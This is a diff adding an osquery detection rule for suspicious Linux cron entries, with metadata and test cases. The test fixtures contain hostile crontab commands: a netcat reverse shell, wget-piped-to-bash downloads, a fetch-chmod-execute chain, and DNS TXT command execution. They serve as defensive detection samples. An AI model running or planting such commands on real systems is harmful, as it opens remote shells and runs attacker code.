@@ -1,0 +1,116 @@
+AnalysisType: rule
+Filename: osquery_linux_suspicious_cron.py
+PolicyID: Osquery.Linux.SuspiciousCron
+DisplayName: Suspicious cron
+Enabled: true
+ResourceTypes:
+  - Osquery.Differential
+Tags:
+  - Osquery
+  - Linux
+Reports:
+  MITRE ATT&CK:
+    Persistence:
+      - Redundant Access
+    Impact:
+      - Resource Hijacking
+Severity: High
+Description: A suspicious cron has been added
+Runbook: Analyze the user who added it and the command being executed
+Reference: https://en.wikipedia.org/wiki/Cron
+Tests:
+  -
+    Name: Netcat Listener
+    ResourceType: Osquery.Differential
+    ExpectedResult: true
+    Resource:
+      {
+        "name": "pack_incident-response_crontab",
+        "action": "added",
+        "columns": {
+          "event": "",
+          "minute": "17",
+          "hour": "*",
+          "day_of_month": "*",
+          "month": "*",
+          "day_of_week": "7",
+          "command": "nc -e /bin/bash 237.233.242.58 80",
+          "path": "/etc/crontab"
+        }
+      }
+  -
+    Name: Wget Pipe Bash
+    ResourceType: Osquery.Differential
+    ExpectedResult: true
+    Resource:
+      {
+        "name": "pack_incident-response_crontab",
+        "action": "added",
+        "columns": {
+          "event": "",
+          "minute": "17",
+          "hour": "*",
+          "day_of_month": "*",
+          "month": "*",
+          "day_of_week": "7",
+          "command": "wget -qO- -U- https://sd9fd8f9d8fe.io/i.sh|bash >/dev/null 2>&1",
+          "path": "/etc/crontab"
+        }
+      }
+  -
+    Name: Wget Execute
+    ResourceType: Osquery.Differential
+    ExpectedResult: true
+    Resource:
+      {
+        "name": "pack_incident-response_crontab",
+        "action": "added",
+        "columns": {
+          "event": "",
+          "minute": "17",
+          "hour": "*",
+          "day_of_month": "*",
+          "month": "*",
+          "day_of_week": "7",
+          "command": "wget -O /tmp/load.sh http://test[.]io/load.sh; chmod 777 /tmp/load.sh; /tmp/load.sh >> /tmp/out.log",
+          "path": "/etc/crontab"
+        }
+      }
+  -
+    Name: Dig
+    ResourceType: Osquery.Differential
+    ExpectedResult: true
+    Resource:
+      {
+        "name": "pack_incident-response_crontab",
+        "action": "added",
+        "columns": {
+          "event": "",
+          "minute": "17",
+          "hour": "*",
+          "day_of_month": "*",
+          "month": "*",
+          "day_of_week": "7",
+          "command": "/bin/sh -c \"sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)\"",
+          "path": "/etc/crontab"
+        }
+      }
+  -
+    Name: Built-in Cron
+    ResourceType: Osquery.Differential
+    ExpectedResult: false
+    Resource:
+      {
+        "name": "pack_incident-response_crontab",
+        "action": "added",
+        "columns": {
+          "event": "",
+          "minute": "17",
+          "hour": "*",
+          "day_of_month": "*",
+          "month": "*",
+          "day_of_week": "7",
+          "command": "root cd / && run-parts --report /etc/cron.hourly",
+          "path": "/etc/crontab"
+        }
+      }
